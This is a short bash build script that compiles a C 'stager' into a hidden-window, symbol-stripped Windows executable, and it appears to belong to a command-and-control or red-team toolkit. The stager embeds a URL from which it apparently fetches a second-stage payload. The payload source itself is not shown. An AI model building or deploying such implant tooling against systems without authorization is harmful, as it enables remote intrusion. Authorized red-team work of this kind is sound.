#!/bin/bash
# Build the C stager for Windows x64
# Usage: ./build.sh <stage_url> [output_name]
#
# Requirements:
#   x86_64-w64-mingw32-gcc (apt install gcc-mingw-w64-x86-64)

set -e

STAGE_URL="${1:-http://127.0.0.1:8080/stage/token}"
OUTPUT="${2:-stager.exe}"

CC="x86_64-w64-mingw32-gcc"
if ! command -v "$CC" &>/dev/null; then
  echo "[-] $CC not found. Install with: apt install gcc-mingw-w64-x86-64"
  exit 1
fi

echo "[*] Building stager → $OUTPUT"
echo "    Stage URL: $STAGE_URL"

"$CC" stager.c \
  -mwindows -Os -s \
  -fno-stack-protector -fno-ident \
  -DSTAGE_URL="\"$STAGE_URL\"" \
  -o "$OUTPUT" \
  -lwinhttp -lkernel32

echo "[+] Built: $OUTPUT ($(du -h "$OUTPUT" | cut -f1))"
